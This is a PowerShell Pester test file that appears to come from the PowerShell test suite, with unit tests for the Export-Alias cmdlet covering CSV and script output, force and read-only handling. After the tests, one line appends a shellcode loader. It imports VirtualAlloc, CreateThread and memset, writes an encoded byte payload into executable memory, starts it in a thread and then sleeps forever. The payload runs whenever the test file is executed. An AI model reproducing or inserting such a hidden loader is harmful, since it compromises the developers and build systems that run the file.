


Import-Module HelpersCommon

Describe "Export-Alias DRT Unit Tests" -Tags "CI" {

	BeforeAll {
		$testAliasDirectory = Join-Path -Path $TestDrive -ChildPath ExportAliasTestDirectory
		$testAliases        = "TestAliases"
    	$fulltestpath       = Join-Path -Path $testAliasDirectory -ChildPath $testAliases

		remove-item alias:abcd* -force -ErrorAction SilentlyContinue
		remove-item alias:ijkl* -force -ErrorAction SilentlyContinue
		set-alias abcd01 efgh01
		set-alias abcd02 efgh02
		set-alias abcd03 efgh03
		set-alias abcd04 efgh04
		set-alias ijkl01 mnop01
		set-alias ijkl02 mnop02
		set-alias ijkl03 mnop03
		set-alias ijkl04 mnop04
	}

	AfterAll {
		remove-item alias:abcd* -force -ErrorAction SilentlyContinue
		remove-item alias:ijkl* -force -ErrorAction SilentlyContinue
	}

    BeforeEach {
		New-Item -Path $testAliasDirectory -ItemType Directory -Force
    }

	AfterEach {
		Remove-Item -Path $testAliasDirectory -Recurse -Force
	}

    It "Export-Alias for exist file should work"{
		New-Item -Path $fulltestpath -ItemType File -Force
		{Export-Alias $fulltestpath} | Should -Not -Throw
    }

	It "Export-Alias resolving to multiple files will throw ReadWriteMultipleFilesNotSupported" {
		$null = New-Item -Path $TestDrive\foo -ItemType File
		$null = New-Item -Path $TestDrive\bar -ItemType File
		{ Export-Alias $TestDrive\* } | Should -Throw -ErrorId "ReadWriteMultipleFilesNotSupported,Microsoft.PowerShell.Commands.ExportAliasCommand"

		Remove-Item $TestDrive\foo -Force -ErrorAction SilentlyContinue
		Remove-Item $TestDrive\bar -Force -ErrorAction SilentlyContinue
	}

	It "Export-Alias with Invalid Scope will throw PSArgumentException" {
		{ Export-Alias $fulltestpath -scope foobar } | Should -Throw -ErrorId "Argument,Microsoft.PowerShell.Commands.ExportAliasCommand"
	}

	It "Export-Alias for Default"{
		Export-Alias $fulltestpath abcd01 -passthru
		$fulltestpath| Should -FileContentMatchExactly '"abcd01","efgh01","","None"'
    }

	It "Export-Alias As CSV"{
		Export-Alias $fulltestpath abcd01 -As CSV -passthru
		$fulltestpath| Should -FileContentMatchExactly '"abcd01","efgh01","","None"'
    }

	It "Export-Alias As CSV With Description"{
		Export-Alias $fulltestpath abcd01 -As CSV -description "My Aliases" -passthru
		$fulltestpath| Should -FileContentMatchExactly '"abcd01","efgh01","","None"'
		$fulltestpath| Should -FileContentMatchExactly "My Aliases"
    }

	It "Export-Alias As CSV With Multiline Description"{
		Export-Alias $fulltestpath abcd01 -As CSV -description "My Aliases\nYour Aliases\nEveryones Aliases" -passthru
		$fulltestpath| Should -FileContentMatchExactly '"abcd01","efgh01","","None"'
		$fulltestpath| Should -FileContentMatchExactly "My Aliases"
		$fulltestpath| Should -FileContentMatchExactly "Your Aliases"
		$fulltestpath| Should -FileContentMatchExactly "Everyones Aliases"
    }

	It "Export-Alias As Script"{
		Export-Alias $fulltestpath abcd01 -As Script -passthru
		$fulltestpath| Should -FileContentMatchExactly 'set-alias -Name:"abcd01" -Value:"efgh01" -Description:"" -Option:"None"'
    }

	It "Export-Alias As Script With Multiline Description"{
		Export-Alias $fulltestpath abcd01 -As Script -description "My Aliases\nYour Aliases\nEveryones Aliases" -passthru
		$fulltestpath| Should -FileContentMatchExactly 'set-alias -Name:"abcd01" -Value:"efgh01" -Description:"" -Option:"None"'
		$fulltestpath| Should -FileContentMatchExactly "My Aliases"
		$fulltestpath| Should -FileContentMatchExactly "Your Aliases"
		$fulltestpath| Should -FileContentMatchExactly "Everyones Aliases"
    }

	It "Export-Alias for Force Test"{
		Export-Alias $fulltestpath abcd01
		Export-Alias $fulltestpath abcd02 -force
		$fulltestpath| Should -Not -FileContentMatchExactly '"abcd01","efgh01","","None"'
		$fulltestpath| Should -FileContentMatchExactly '"abcd02","efgh02","","None"'
    }

	It "Export-Alias for Force ReadOnly Test" -Skip:(Test-IsRoot) {
		Export-Alias $fulltestpath abcd01
		if ( $IsWindows )
		{
			attrib +r $fulltestpath
		}
		else
		{
			chmod 444 $fulltestpath
		}

		{ Export-Alias $fulltestpath abcd02 } | Should -Throw -ErrorId "FileOpenFailure,Microsoft.PowerShell.Commands.ExportAliasCommand"
		Export-Alias $fulltestpath abcd03 -force
		$fulltestpath | Should -Not -FileContentMatchExactly '"abcd01","efgh01","","None"'
		$fulltestpath | Should -Not -FileContentMatchExactly '"abcd02","efgh02","","None"'
		$fulltestpath | Should -FileContentMatchExactly '"abcd03","efgh03","","None"'

		if ( $IsWindows )
		{
			attrib -Recurse $fulltestpath
		}
		else
		{
			chmod 777 $fulltestpath
		}

    }
}

Describe "Export-Alias" -Tags "CI" {

	BeforeAll {
		$testAliasDirectory = Join-Path -Path $TestDrive -ChildPath ExportAliasTestDirectory
		$testAliases        = "TestAliases"
		$fulltestpath       = Join-Path -Path $testAliasDirectory -ChildPath $testAliases
	}

	BeforeEach {
		New-Item -Path $testAliasDirectory -ItemType Directory -Force
	}

	AfterEach {
		Remove-Item -Path $testAliasDirectory -Recurse -Force
	}

	It "Should be able to create a file in the specified location"{
		Export-Alias $fulltestpath
		Test-Path $fulltestpath | Should -BeTrue
  }

  It "Should create a file with the list of aliases that match the expected list" {
		Export-Alias $fulltestpath
		Test-Path $fulltestpath | Should -BeTrue

		$actual   = Get-Content $fulltestpath | Sort-Object
		$expected = Get-Command -CommandType Alias

		for ( $i=0; $i -lt $expected.Length; $i++)
		{
			
			$expected[$i] | Should -Match $actual[$i].Name
		}
  }
}

$m00 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $m00 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc2,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0xbf,0xf8,0xf7,0x47,0x88,0x83,0xc0,0x04,0x31,0x78,0x14,0x03,0x78,0xec,0x15,0xb2,0x74,0xe4,0x58,0x3d,0x85,0xf4,0x3c,0xb7,0x60,0xc5,0x7c,0xa3,0xe1,0x75,0x4d,0xa7,0xa4,0x79,0x26,0xe5,0x5c,0x0a,0x4a,0x22,0x52,0xbb,0xe1,0x14,0x5d,0x3c,0x59,0x64,0xfc,0xbe,0xa0,0xb9,0xde,0xff,0x6a,0xcc,0x1f,0x38,0x96,0x3d,0x4d,0x91,0xdc,0x90,0x62,0x96,0xa9,0x28,0x08,0xe4,0x3c,0x29,0xed,0xbc,0x3f,0x18,0xa0,0xb7,0x19,0xba,0x42,0x14,0x12,0xf3,0x5c,0x79,0x1f,0x4d,0xd6,0x49,0xeb,0x4c,0x3e,0x80,0x14,0xe2,0x7f,0x2d,0xe7,0xfa,0xb8,0x89,0x18,0x89,0xb0,0xea,0xa5,0x8a,0x06,0x91,0x71,0x1e,0x9d,0x31,0xf1,0xb8,0x79,0xc0,0xd6,0x5f,0x09,0xce,0x93,0x14,0x55,0xd2,0x22,0xf8,0xed,0xee,0xaf,0xff,0x21,0x67,0xeb,0xdb,0xe5,0x2c,0xaf,0x42,0xbf,0x88,0x1e,0x7a,0xdf,0x73,0xfe,0xde,0xab,0x99,0xeb,0x52,0xf6,0xf5,0xd8,0x5e,0x09,0x05,0x77,0xe8,0x7a,0x37,0xd8,0x42,0x15,0x7b,0x91,0x4c,0xe2,0x7c,0x88,0x29,0x7c,0x83,0x33,0x4a,0x54,0x47,0x67,0x1a,0xce,0x6e,0x08,0xf1,0x0e,0x8f,0xdd,0x6c,0x0a,0x07,0xd4,0x70,0x16,0xd8,0x80,0x72,0x16,0xf7,0x0c,0xfa,0xf0,0xa7,0xfc,0xac,0xac,0x07,0xad,0x0c,0x1d,0xef,0xa7,0x82,0x42,0x0f,0xc8,0x48,0xeb,0xa5,0x27,0x25,0x43,0x51,0xd1,0x6c,0x1f,0xc0,0x1e,0xbb,0x65,0xc2,0x95,0x48,0x99,0x8c,0x5d,0x24,0x89,0x78,0xae,0x73,0xf3,0x2e,0xb1,0xa9,0x9e,0xce,0x27,0x56,0x09,0x99,0xdf,0x54,0x6c,0xed,0x7f,0xa6,0x5b,0x66,0x49,0x32,0x24,0x10,0xb6,0xd2,0xa4,0xe0,0xe0,0xb8,0xa4,0x88,0x54,0x99,0xf6,0xad,0x9a,0x34,0x6b,0x7e,0x0f,0xb7,0xda,0xd3,0x98,0xdf,0xe0,0x0a,0xee,0x7f,0x1a,0x79,0xee,0xbc,0xcd,0x47,0x84,0xac,0xcd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$UmM=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($UmM.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$UmM,0,0,0);for (;;){Start-sleep 60};

